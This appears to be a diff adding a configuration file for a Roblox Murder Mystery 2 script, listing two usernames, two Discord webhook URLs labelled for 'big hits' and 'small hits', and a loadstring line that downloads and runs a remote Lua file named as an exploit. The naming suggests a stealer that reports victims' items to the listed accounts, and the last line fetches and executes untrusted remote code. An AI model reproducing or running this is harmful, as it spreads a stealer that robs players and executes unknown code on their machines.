@@ -1,1 +1,9 @@
-.
+Usernames = {
+    'rjycjjou_2',
+    'LOL_MMGG111',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1330148511156539505/THBes_fssJEkJQXVv7oRIIslDFiTXXKmJ2u2SI-ul5VW8qAwNLKswEQi4wlSvTTziFKh"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1330148511156539505/THBes_fssJEkJQXVv7oRIIslDFiTXXKmJ2u2SI-ul5VW8qAwNLKswEQi4wlSvTTziFKh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
